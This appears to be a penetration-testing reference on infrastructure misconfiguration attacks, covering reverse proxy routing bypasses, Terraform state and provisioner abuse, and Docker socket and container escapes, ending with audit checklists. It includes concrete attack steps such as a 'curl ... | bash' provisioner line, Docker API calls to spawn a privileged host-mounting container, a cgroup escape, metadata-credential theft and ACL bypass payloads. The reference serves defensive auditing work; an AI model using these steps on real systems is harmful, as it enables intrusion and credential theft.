# Infrastructure Misconfiguration Attacks Reference

## Reverse Proxy Attacks (Traefik, Nginx, HAProxy, Caddy)

### Path Confusion & Routing Bypass

- **Path normalization differential:** proxy normalizes URL path differently than backend — proxy allows `/admin/%2e%2e/public`, backend resolves traversal to `/admin/../public` → `/public`, bypassing proxy ACL on `/admin`
- **Traefik `exposedByDefault=true`:** Docker provider default exposes ALL containers with exposed ports to the internet — any container without explicit `traefik.enable=false` label gets a route. Internal databases, debug services, admin panels reachable if no override set
- **Traefik dashboard exposure:** `/api/rawdata` endpoint returns full routing table including backend IPs, middleware chains, TLS config, and service URLs — no authentication by default in Traefik v2 `insecure` mode. `/dashboard/` similarly exposes the web UI
- **Middleware typo silent failure:** `traefik.http.routers.app.middlewares=auth-hedaers` (typo) — Traefik logs a warning but applies NO middleware. Route serves without authentication, authorization, rate limiting, or any other intended protection. No error, no failure — silent bypass
- **Priority conflicts:** overlapping router rules (`PathPrefix(/api)` on two routers) resolved by Traefik's auto-calculated priority (longest rule wins). Attacker-controlled route with longer path prefix overrides legitimate route → request hijacking
- **TLS termination cleartext:** proxy terminates TLS, forwards HTTP to backend over internal network — container-to-container traffic on Docker bridge or Kubernetes pod network is cleartext. ARP spoofing, network namespace escape, or adjacent pod compromise exposes all traffic
- **Nginx `merge_slashes on` (default):** `//admin` normalized to `/admin` by Nginx, but backend framework may treat `//admin` as different route → ACL bypass
- **HAProxy `http-request deny` ordering:** deny rules evaluated in config order — a later `use_backend` can match before deny rule if ACL is ambiguous. Backend reached despite deny intent
- **Caddy `handle` vs `handle_path`:** `handle_path /api/*` strips prefix before forwarding, `handle /api/*` does not — mismatch leads to path confusion at backend (backend receives `/api/internal` vs `/internal`)

### Request Routing Exploitation

- **Host header manipulation through proxy chains:** reverse proxy trusts `Host` header from upstream proxy. Attacker sets `Host: internal-service.local` → proxy routes to internal backend. Exploitable when proxy doesn't rewrite `Host` and backend uses virtual hosting
- **X-Forwarded-For spoofing:** `X-Forwarded-For: 127.0.0.1` prepended by attacker when trusted proxy list is misconfigured or missing — backend IP allowlist bypassed. Traefik `forwardedHeaders.trustedIPs` must whitelist only known proxies; empty = trust all
- **X-Real-IP injection:** attacker sends `X-Real-IP: 10.0.0.1` — if proxy doesn't overwrite (only appends), backend reads attacker-controlled internal IP. Nginx `set_real_ip_from` directive must match proxy CIDR exactly
- **WebSocket upgrade through proxy:** proxy allows `Connection: Upgrade` pass-through without re-authenticating — initial HTTP request authenticated, WebSocket connection persists without session validation. Long-lived unauthenticated channel
- **gRPC routing misconfiguration:** Traefik gRPC requires `h2c` scheme for unencrypted backends — using `http` silently downgrades, breaking streaming and potentially exposing proto reflection service (`grpc.reflection.v1alpha.ServerReflection`) that maps entire API surface
- **Protocol downgrade smuggling:** HTTP/2 frontend converts to HTTP/1.1 for backend — enables H2.CL/H2.TE smuggling (see protocol-infra-attacks.md). Traefik, Nginx, and HAProxy all perform this conversion by default for non-h2c backends
- **Docker socket exposure via Traefik:** Traefik's Docker provider requires read access to Docker socket (`/var/run/docker.sock`). If Traefik container is compromised → full Docker API access → create privileged container mounting host `/` → host root. Even read-only socket access allows container inspection (env vars, secrets, labels)
- **Docker socket proxy bypass:** socket proxy (e.g., Tecnativa/docker-socket-proxy) filters Docker API by HTTP method — blocks `POST /containers/create` but `GET /containers/{id}/logs` still leaks secrets from container stdout. Some proxies filter by path prefix only, bypassed via URL encoding or path traversal

---

## Infrastructure as Code Attacks (Terraform/OpenTofu)

### State File Exposure

- **State file is plaintext JSON:** contains every resource attribute including passwords, API keys, TLS private keys, database connection strings, cloud credentials — `terraform.tfstate` is the single highest-value target in any IaC environment
- **S3 bucket misconfiguration:** state backend `s3://company-terraform-state/prod.tfstate` with public read or overly permissive bucket policy → attacker downloads state → harvests all secrets. Common: bucket ACL allows `s3:GetObject` to `*` or IAM role is too broad
- **State file in git history:** `terraform.tfstate` added to `.gitignore` after initial commit — file removed from working tree but persists in git history forever. `git log --all --full-history -- terraform.tfstate` → `git show <hash>:terraform.tfstate` → full credential dump
- **State locking disabled:** concurrent `terraform apply` without DynamoDB locking (AWS) or equivalent → race condition corrupts state file → resources orphaned or duplicated. Security groups, IAM policies may be partially applied — permissive rules without restrictive counterparts
- **Remote backend without encryption at rest:** S3 backend without `encrypt = true` or without KMS key — state stored unencrypted. CloudTrail logs show who accessed it, but S3 server-side encryption is not enabled by default for state
- **State file in Terraform Cloud/Enterprise:** API token (`TFE_TOKEN`) compromise → download any workspace state via `GET /api/v2/workspaces/:id/current-state-version` → credential harvest across all managed infrastructure

### IaC-Specific Exploitation

- **`terraform import` ownership hijack:** `terraform import aws_s3_bucket.target <bucket-arn>` — if attacker has Terraform state write access, they can import existing resources into their state, then `terraform destroy` to delete them or `terraform apply` to modify them
- **Provider credential leak via `TF_LOG=DEBUG`:** debug logging outputs full HTTP request/response bodies including `Authorization` headers, API keys, and OAuth tokens for every provider API call. CI/CD pipelines with debug logging enabled expose all cloud credentials in build logs
- **Malicious Terraform modules (registry typosquatting):** `module "vpc" { source = "hashicorp/vcp/aws" }` (typo: `vcp` not `vpc`) — attacker publishes typosquatted module on public registry. Module executes arbitrary code during `terraform init` via provider downloads and during `terraform apply` via `local-exec`
- **Provider supply chain attack:** Terraform providers are Go binaries executed with full system privileges. Compromised provider binary (via registry account takeover, build pipeline injection, or typosquatting) has arbitrary code execution during every `plan` and `apply`
- **`local-exec` provisioner RCE:** `provisioner "local-exec" { command = "curl ${var.callback_url} | bash" }` — executes arbitrary commands on the machine running Terraform (CI/CD runner, developer workstation). User-controlled variables in command string → command injection
- **`remote-exec` provisioner RCE:** executes commands on provisioned infrastructure via SSH/WinRM — if provisioner credentials are in state (they are), state file compromise → remote code execution on all provisioned hosts
- **`external` data source:** `data "external" "exploit" { program = ["python3", "script.py"] }` — executes arbitrary program during `terraform plan` (not just apply). Malicious module can run code at plan time without any visible resource changes
- **State manipulation via `terraform state mv`:** rewrite resource addresses to reassign ownership. Move security group rules to different groups, reassign IAM policy attachments, redirect DNS records — all without triggering resource recreation
- **Plan file as secret:** `terraform plan -out=plan.tfplan` produces binary file containing full provider credentials, resource attributes, and planned changes. Treat as equivalent to state file. `terraform show -json plan.tfplan` dumps everything as JSON

### Drift Exploitation

- **Security control drift:** manual console change removes WAF rule, tightens nothing — IaC shows "compliant" because `terraform plan` only detects drift on next run. Between runs, infrastructure is unprotected but appears compliant to audit tools
- **`ignore_changes` hiding modifications:** `lifecycle { ignore_changes = [tags, security_group_ids] }` — Terraform ignores manual changes to these attributes. Security group replaced manually with permissive rules → Terraform never detects or reverts. Common in teams that use `ignore_changes` to prevent "noisy" plans
- **`-target` partial applies:** `terraform apply -target=aws_instance.web` creates instance but skips associated security group, IAM role, or encryption config defined in same module → resource exists without security controls. State records partial apply as successful
- **`prevent_destroy` false confidence:** `lifecycle { prevent_destroy = true }` only prevents `terraform destroy` — resource can still be modified, reimported, or removed from state with `terraform state rm` then manually deleted

---

## Docker Socket & Container Escape

- **Traefik Docker socket mount → host root:** Traefik requires `/var/run/docker.sock:/var/run/docker.sock` for Docker provider. Compromised Traefik container → `curl --unix-socket /var/run/docker.sock http://localhost/containers/json` lists all containers. Create privileged container: `POST /containers/create` with `"Binds": ["/:/host"]` and `"Privileged": true` → `chroot /host` → host root shell
- **Docker socket proxy incomplete ACLs:** socket proxies (Tecnativa, HAProxy-based) filter by HTTP method + path. Common bypasses:
  - `POST /v1.41/containers/create` blocked but `POST /v1.40/containers/create` allowed (version prefix varies)
  - `GET /containers/{id}/exec` inspection allowed → `POST /exec/{id}/start` also allowed → command execution
  - URL encoding: `/containers/%63reate` bypasses string matching
  - `POST /build` (image build) often unfiltered → Dockerfile with `RUN` commands → arbitrary execution on Docker host
- **Volume mounts exposing host filesystem:** `volumes: ["/etc:/host-etc:ro", "/var/log:/host-logs"]` — read-only still exposes `/etc/shadow`, SSH keys, TLS certs. Read-write mounts to `/var/run`, `/proc`, or `/sys` enable various escape techniques
- **Container escape via `CAP_SYS_ADMIN`:** without `--privileged` but with `CAP_SYS_ADMIN` → `mount -t cgroup2 none /tmp/cgrp` → write to `release_agent` → execute command on host when cgroup is released. Also enables `mount` of host devices, `unshare` for new namespaces
- **`/proc/self/exe` escape (CVE-2019-5736 / runC):** overwrite host `runc` binary via `/proc/self/exe` symlink from within container → next container operation executes attacker binary as root on host. Patched but older runtimes still vulnerable

---

## Cross-Cutting Attack Chains

### Proxy → IaC Chains

| Chain | Steps | Impact |
|-------|-------|--------|
| **Traefik dashboard → state file** | Exposed Traefik dashboard reveals S3 backend URL in environment → download terraform.tfstate → harvest cloud credentials | Full cloud account compromise |
| **Docker socket → cloud metadata** | Traefik socket compromise → create container with host networking → `curl 169.254.169.254` → cloud IAM credentials → pivot to cloud control plane | Cloud account takeover |
| **State file drift → silent degrade** | Attacker modifies security group via console → IaC shows no drift (next plan not run or `ignore_changes`) → infrastructure exposed for days/weeks | Persistent undetected exposure |

### Reverse Proxy → Backend Confusion Matrix

| Proxy | Backend | Confusion Vector | Exploit |
|-------|---------|-------------------|---------|
| Nginx | Spring Boot | `;` (matrix param) | `/admin;bypass=true` — Nginx matches `/admin`, Spring strips `;bypass=true` |
| Traefik | Express.js | Case sensitivity | `/Admin` — Traefik PathPrefix case-sensitive (no match), Express case-insensitive (matches `/admin`) |
| HAProxy | Flask | Double slash | `//admin` — HAProxy ACL on `/admin` doesn't match, Flask normalizes to `/admin` |
| Caddy | Django | Trailing slash | `/admin` — Caddy matches, Django redirects to `/admin/` which may bypass a different rule |
| Any | PHP | Null byte | `/admin%00.jpg` — proxy sees `.jpg` extension (static), PHP truncates at null → serves `/admin` |

---

## Detection & Audit Patterns

### IaC Scanning Tools

| Tool | Target | Key Checks |
|------|--------|------------|
| **Checkov** | Terraform, Dockerfiles | State encryption, public S3, privileged containers, host mounts |
| **tfsec** / **trivy config** | Terraform HCL | Unencrypted state backends, overly permissive security groups, missing logging |
| **Trivy** | Container images, IaC, filesystem | CVEs in images, IaC misconfigs, secret detection in filesystem |

### Traefik Security Audit Checklist

- [ ] `exposedByDefault` set to `false` in Docker provider config
- [ ] Dashboard disabled or behind authentication middleware (`basicAuth`, `forwardAuth`, or `digestAuth`)
- [ ] `/api/rawdata` endpoint not accessible externally
- [ ] All middleware names verified (no typos → no silent bypass)
- [ ] `forwardedHeaders.trustedIPs` explicitly configured with known proxy CIDRs
- [ ] Docker socket access via read-only socket proxy (not direct mount)
- [ ] TLS configured on entrypoints (not just between client and proxy, but proxy-to-backend where possible)
- [ ] Router priorities explicitly set where rules overlap

### Terraform State Security Checklist

- [ ] State backend encrypted at rest (S3: `encrypt = true` + KMS key; GCS: default encrypted; Azure: storage account encryption)
- [ ] State backend access restricted via IAM (no public access, no broad roles)
- [ ] State locking enabled (DynamoDB for S3, native for Terraform Cloud)
- [ ] State file never committed to version control (`.gitignore` + `git log` audit for historical commits)
- [ ] `TF_LOG` never set to `DEBUG`/`TRACE` in CI/CD (credential leak)
- [ ] Plan files (`*.tfplan`) treated as secrets (not stored in artifacts, not logged)
- [ ] Sensitive outputs marked with `sensitive = true` (suppresses CLI display, still in state)
- [ ] Provider credentials via environment variables or OIDC, never in HCL files
